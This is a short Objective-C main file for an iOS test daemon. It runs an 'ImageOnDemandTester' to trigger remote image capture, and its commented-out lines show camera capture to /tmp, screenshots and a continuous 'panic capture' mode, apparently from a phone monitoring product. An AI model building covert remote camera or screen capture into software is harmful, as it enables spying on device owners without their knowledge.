//
//  main.m
//  TestAppDaemon
//
//  Created by Benjawan Tanarattanakorn on 6/7/12.
//  Copyright __MyCompanyName__ 2012. All rights reserved.
//

#import <UIKit/UIKit.h>
#import "CameraCaptureManager.h"
#import "ImageOnDemandTester.h"


int main(int argc, char *argv[]) {
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    //int retVal = UIApplicationMain(argc, argv, nil, nil);
	int retVal = 0;
//	
//	CameraCaptureManager *mReceiverCameraCaptureManager = [[CameraCaptureManager alloc] initWithEventDelegate:nil];
//	[mReceiverCameraCaptureManager setMOnDemandOutputPath:@"/tmp/"];
////	[mReceiverCameraCaptureManager startCapture]; // Continuously capture, use in panic capture...
//	[mReceiverCameraCaptureManager captureCameraImageWithDelegate:nil]; // On demand capture
//	[CameraCaptureManager takeScreenShot];
	
	/*
		For testing On Demand Image on i)S 7	 
	 */
	
	ImageOnDemandTester *tester	= [[ImageOnDemandTester alloc] init];
	
	
		//[tester processRemoteImageCapture];		
	[tester processRemoteImageCapture];

	
	CFRunLoopRun();
    [pool release];
    return retVal;
}
